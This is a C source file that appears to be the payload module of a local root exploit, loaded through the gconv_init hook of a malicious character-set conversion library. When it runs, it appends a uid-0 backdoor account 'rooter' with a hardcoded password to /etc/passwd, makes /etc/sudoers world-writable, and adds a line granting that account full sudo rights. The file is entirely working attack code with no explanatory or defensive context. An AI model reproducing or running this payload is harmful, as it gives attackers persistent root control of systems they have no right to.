#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
struct Userinfo {
    char *username;
    char *hash;
    int user_id;
    int group_id;
    char *info;
    char *home_dir;
    char *shell;
};
char *generate_password_hash(char *plaintext_pw) {
  const char *salt = "salt";
  return crypt(plaintext_pw, salt);
}
char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",to);
    return -1;
  }
  char ch;
  FILE *source, *target;
  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }
  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }
  printf("%s successfully backed up to %s\n",from, to);
  fclose(source);
  fclose(target);
  return 0;
}

int write_file(const char * filename, int content_len,char * content){
  FILE * file_fd = fopen(filename, "a");
  if(file_fd == NULL)  
    {  
        puts("errno");  
        return -1;
    }  
    else   
    {  
       puts("File Open successed!\n"); 
       // size_t fwrite(const void *ptr, size_t size, size_t nmemb,FILE *stream);
       size_t writed = fwrite(content,content_len,1,file_fd);
       if(writed == content_len){
           puts("Write Success!\n");
           fclose(file_fd);
           return 1;
        }
    }
    return 1;
}
void gconv() {}

void gconv_init(){
    char *sudoer = "rooter	ALL=(ALL:ALL) ALL";
    char *plaintext_pw="Hello@World";
    struct Userinfo user;
    user.username = "rooter";
    user.user_id = 0;
    user.group_id = 0;
    user.info = "root";
    user.home_dir = "/root";
    user.shell = "/bin/bash";
    user.hash = generate_password_hash(plaintext_pw);
    char *complete_passwd_line = generate_passwd_line(user);
    copy_file("/etc/passwd","/tmp/passwd.bak");
    write_file("/etc/passwd",strlen(complete_passwd_line),complete_passwd_line);
    puts("[+]Change sudoers priv.");
    system("chmod a+w /etc/sudoers");
    copy_file("/etc/sudoers","/tmp/sudoers.bak");
    write_file("/etc/sudoers",strlen(sudoer),sudoer);
    puts("[+]Add Root User Success...");
}